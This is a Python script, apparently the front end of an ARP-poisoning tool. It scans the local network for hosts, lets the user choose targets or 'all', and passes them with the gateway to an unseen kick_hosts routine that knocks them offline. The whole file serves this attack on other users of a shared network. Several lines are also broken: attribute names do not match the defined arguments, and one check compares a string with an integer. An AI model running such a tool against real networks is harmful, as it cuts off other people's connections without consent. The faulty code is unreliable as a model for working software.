from scapy.all import *
import argparse
import re
from get_hosts import get_all_hosts
from poisoner import kick_hosts
import os

def get_defult_gateway():
    packet = IP(dst="google.com", ttl=0)
    ans = sr1(packet, verbose=False)
    return ans.src

def main():
    parser = argparse.ArgumentParser("ARP poisener")

    parser.add_argument("--tip", help="""The IP of your target""", type=str)
    parser.add_argument("--gwy", help="""The IP of your target's gateway""", type=str)

    args = parser.parse_args()
    if args.tip:
        target_ip_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.target_ip)
        if not bool(target_ip_validated):
            print("Invalid target IP!")
            exit()
        targets = [args.target_ip]

    else:
        if os.geteuid() != 0:
            print("You need to be root to search hosts...\nYou can run this script with the --tip parameter to set the target ip manualy ")
            exit()
        print("Serching for online hosts...\n")
        ans = get_all_hosts()
        if not ans or len(ans) == 0:
            print("No hosts...")
            exit()
        
        print(str(len(ans)) + " hosts found:\n")
        for i, host in enumerate(ans):
            print(str(i+1) + ": " + host)
        
        targets = []
        print("Which host would you like to kick? Enter their indexes (starting from 1) seperated by space. (For example: 1 3 6)\nIf you want to attack all hosts enter \"all\"")
        hosts_to_kick = input()

        if(hosts_to_kick == "all"):
            targets = ans

        else:
            indexes = hosts_to_kick.split()

            for index in indexes:
                if not index.isdigit():
                    print("Invalid input at: "+ index)
                    exit()
                if int(index) > len(ans) or int((index) < 1):
                    print("Index out of bounds at: "+ index)
                    exit()
                try:
                    targets.append(ans[int(index)-1])
                except Exception:
                    print("Invalid input")
                    exit()
        
    if args.gwy:
        gateway_validated = re.search(r"^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$", args.gateway)
        if not bool(gateway_validated):
            print("Invalid gateway IP!")
            exit()
        gateway = args.gateway
    else:
        gateway = get_defult_gateway()

    kick_hosts(targets, gateway)


if __name__ == "__main__":
    main()